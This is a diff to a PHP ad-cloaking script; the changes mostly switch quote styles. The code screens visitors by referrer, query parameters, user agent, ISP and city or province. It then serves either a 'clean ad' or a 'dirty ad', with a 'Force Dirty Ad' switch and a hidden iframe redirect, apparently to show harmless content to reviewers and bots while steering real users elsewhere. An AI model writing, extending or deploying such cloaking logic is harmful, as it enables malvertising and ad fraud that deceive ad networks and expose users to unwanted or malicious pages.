@@ -234,14 +234,14 @@
 		$ip  = getClientIP();
 		$isp = getISPInfo($ip);
 
-		return str_replace("|Message|\n", "|RequestMethod|" . $_SERVER['REQUEST_METHOD'] . "|", createLogLine($ip, $isp, ""));
+		return str_replace("|Message|\n", "|RequestMethod|" . $_SERVER['REQUEST_METHOD'] . "|", createLogLine($ip, $isp["isp"], ""));
 
 		$referrer = array_key_exists('HTTP_REFERER', $_SERVER) ? $_SERVER['HTTP_REFERER'] : "Unknown";
 
 		$ip  = getClientIP();
 		$isp = getISPInfo($ip);
 
-		return "ISP|\"".$isp['isp']."\"|QueryString|\"".$_SERVER['QUERY_STRING']."\"|Server Referrer|\"".$referer."\"|";
+		return "ISP|\"".$isp["isp"]."\"|QueryString|\"".$_SERVER['QUERY_STRING']."\"|Server Referrer|\"".$referer."\"|";
 	}	
 
 	function handleTrafficLoggerData($campaignID)
@@ -385,10 +385,10 @@
 
 	if ($loggingEnabled)
 	{
-		adlog($campaignID, $ip, $isp['isp'],
+		adlog($campaignID, $ip, $isp["isp"],
 			"INFO:GEO:" .
 			'ip:"'.$ip.'",'.
-			'isp:"'.$isp['isp'].'",'.
+			'isp:"'.$isp["isp"].'",'.
 			'city:"'.$geo['city'].'",'.
 			'province:"'.$geo['province'].'",'.
 			'country:"'.$geo['country'].'",'.
@@ -407,7 +407,7 @@
 
 		if ($loggingEnabled)
 		{
-			adlog($campaignID, $ip, $isp['isp'], "Traffic Logger Enabled.");
+			adlog($campaignID, $ip, $isp["isp"], "Traffic Logger Enabled.");
 		}		
 	}
 	else
@@ -425,7 +425,7 @@
 
 				if ($loggingEnabled)
 				{
-					mbotlog($campaignID, $ip, $isp['isp'], "CHECK:REFERRER_BLACKLIST_BLOCKED:$_SERVER[HTTP_REFERER]: Referrer $_SERVER[HTTP_REFERER] is in blacklist.");
+					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_BLACKLIST_BLOCKED:$_SERVER[HTTP_REFERER]: Referrer $_SERVER[HTTP_REFERER] is in blacklist.");
 				}
 
 				break;
@@ -434,7 +434,7 @@
 
 		if (!$serveCleanAd && $loggingEnabled)
 		{
-			mbotlog($campaignID, $ip, $isp['isp'], "CHECK:REFERRER_BLACKLIST_ALLOWED:$_SERVER[HTTP_REFERER]: Referrer $_SERVER[HTTP_REFERER] is NOT in blacklist.");
+			mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_BLACKLIST_ALLOWED:$_SERVER[HTTP_REFERER]: Referrer $_SERVER[HTTP_REFERER] is NOT in blacklist.");
 		}
 
 		if (!$serveCleanAd && !empty($whitelistedReferrers))
@@ -457,12 +457,12 @@
 
 				if ($loggingEnabled)
 				{
-					mbotlog($campaignID, $ip, $isp['isp'], "CHECK:REFERRER_WHITELIST_BLOCKED:$_SERVER[HTTP_REFERER]: Referrer $_SERVER[HTTP_REFERER] is not in whitelist.");
+					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_WHITELIST_BLOCKED:$_SERVER[HTTP_REFERER]: Referrer $_SERVER[HTTP_REFERER] is not in whitelist.");
 				}
 			}
 			elseif ($loggingEnabled)
 			{
-				mbotlog($campaignID, $ip, $isp['isp'], "CHECK:REFERRER_WHITELIST_ALLOWED:$_SERVER[HTTP_REFERER]: Referrer $_SERVER[HTTP_REFERER] is in whitelist.");
+				mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_WHITELIST_ALLOWED:$_SERVER[HTTP_REFERER]: Referrer $_SERVER[HTTP_REFERER] is in whitelist.");
 			}
 		}
 	}
@@ -480,14 +480,14 @@
 
 					if ($loggingEnabled)
 					{
-						mbotlog($campaignID, $ip, $isp['isp'], "CHECK:PARAMETER_BLOCKED:$parameter:$_GET[$parameter]: Parameter $parameter has blocked value: $_GET[$parameter].");
+						mbotlog($campaignID, $ip, $isp["isp"], "CHECK:PARAMETER_BLOCKED:$parameter:$_GET[$parameter]: Parameter $parameter has blocked value: $_GET[$parameter].");
 					}
 
 					break;
 				}
 				else if ($loggingEnabled)
 				{
-					mbotlog($campaignID, $ip, $isp['isp'], "CHECK:PARAMETER_ALLOWED:$parameter:$_GET[$parameter]: Parameter $parameter with value $_GET[$parameter] is allowed.");
+					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:PARAMETER_ALLOWED:$parameter:$_GET[$parameter]: Parameter $parameter with value $_GET[$parameter] is allowed.");
 				}
 			}
 			else
@@ -496,7 +496,7 @@
 
 				if ($loggingEnabled)
 				{
-					mbotlog($campaignID, $ip, $isp['isp'], "CHECK:PARAMETER_MISSING:$parameter: Parameter $parameter missing from querystring.");
+					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:PARAMETER_MISSING:$parameter: Parameter $parameter missing from querystring.");
 				}
 
 				break;
@@ -521,14 +521,14 @@
 
 					if ($loggingEnabled)
 					{
-						mbotlog($campaignID, $ip, $isp['isp'], "CHECK:REFERRER_PARAMETER_BLOCKED:$parameter:$referrerParameters[$parameter]: Parameter $parameter has blocked value: $referrerParameters[$parameter].");
+						mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_PARAMETER_BLOCKED:$parameter:$referrerParameters[$parameter]: Parameter $parameter has blocked value: $referrerParameters[$parameter].");
 					}
 
 					break;
 				}
 				else if ($loggingEnabled)
 				{
-					mbotlog($campaignID, $ip, $isp['isp'], "CHECK:REFERRER_PARAMETER_ALLOWED:$parameter:$referrerParameters[$parameter]: Parameter $parameter with value $referrerParameters[$parameter] is allowed.");
+					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_PARAMETER_ALLOWED:$parameter:$referrerParameters[$parameter]: Parameter $parameter with value $referrerParameters[$parameter] is allowed.");
 				}
 			}
 			else
@@ -537,7 +537,7 @@
 
 				if ($loggingEnabled)
 				{
-					mbotlog($campaignID, $ip, $isp['isp'], "CHECK:REFERRER_PARAMETER_MISSING:$parameter: Parameter $parameter missing from referrer querystring.");
+					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_PARAMETER_MISSING:$parameter: Parameter $parameter missing from referrer querystring.");
 				}
 
 				break;
@@ -551,7 +551,7 @@
 
 		if ($loggingEnabled)
 		{
-			adlog($campaignID, $ip, $isp['isp'], "CHECK:USERAGENT_MOBILE:$_SERVER[HTTP_USER_AGENT]: UserAgent is not a mobile device.");
+			adlog($campaignID, $ip, $isp["isp"], "CHECK:USERAGENT_MOBILE:$_SERVER[HTTP_USER_AGENT]: UserAgent is not a mobile device.");
 		}
 	}
 	elseif (!$serveCleanAd && $ispCloakingEnabled)
@@ -563,7 +563,7 @@
 			$allowedIsps = $allowedIspsPerCountry[$adCountry];
 		}
 
-		if ((empty($allowedIsps) || in_array($isp['isp'], $allowedIsps)) &&
+		if ((empty($allowedIsps) || in_array($isp["isp"], $allowedIsps)) &&
 			!in_array($geo['city'], $blacklistedCities) &&
 			!in_array($geo['province'], $blacklistedProvinces) &&
 			!in_array($geo['subdiv1_code'], $blacklistedSubDivs1) &&
@@ -575,7 +575,7 @@
 
 			if ($loggingEnabled)
 			{
-				adlog($campaignID, $ip, $isp['isp'], "CHECK:GEO_ALLOWED: ISP/Geo is allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
+				adlog($campaignID, $ip, $isp["isp"], "CHECK:GEO_ALLOWED: ISP/Geo is allowed. ISP: " . $isp["isp"] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
 			}
 		}
 		else
@@ -584,7 +584,7 @@
 
 			if ($loggingEnabled)
 			{
-				adlog($campaignID, $ip, $isp['isp'], "CHECK:GEO_BLOCKED: ISP/Geo is NOT allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
+				adlog($campaignID, $ip, $isp["isp"], "CHECK:GEO_BLOCKED: ISP/Geo is NOT allowed. ISP: " . $isp["isp"] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
 			}
 		}
 	}
@@ -629,7 +629,7 @@
 	{
 		if ($loggingEnabled && !$redirectEnabled)
 		{
-			adlog($campaignID, $ip, $isp['isp'], "CHECK:REDIRECT_DISABLED: Redirect disabled.");
+			adlog($campaignID, $ip, $isp["isp"], "CHECK:REDIRECT_DISABLED: Redirect disabled.");
 		}
 
 		if ($trafficLoggerEnabled)
@@ -661,11 +661,11 @@
 	{
 		if ($loggingEnabled)
 		{
-			allowedTrafficLog($campaignID, $ip, $isp['isp']);
+			allowedTrafficLog($campaignID, $ip, $isp["isp"]);
 
 			if ($forceDirtyAd)
 			{
-				adlog($campaignID, $ip, $isp['isp'], "Force Dirty Ad enabled.");
+				adlog($campaignID, $ip, $isp["isp"], "Force Dirty Ad enabled.");
 			}
 		}
 
@@ -704,7 +704,7 @@
 
 		if ($loggingEnabled)
 		{
-			adlog($campaignID, $ip, $isp['isp'], $redirectUrl);
+			adlog($campaignID, $ip, $isp["isp"], $redirectUrl);
 		}
 
 		$hiddeniFrameRedirect = "var el = document.createElement('iframe');
@@ -849,7 +849,7 @@
 
 	if ($outputMethod == "JS")
 	{
-		header('Content-Type: application/javascript');
+		header("Content-Type: application/javascript");
 	}
 
 	echo $resultHtml;
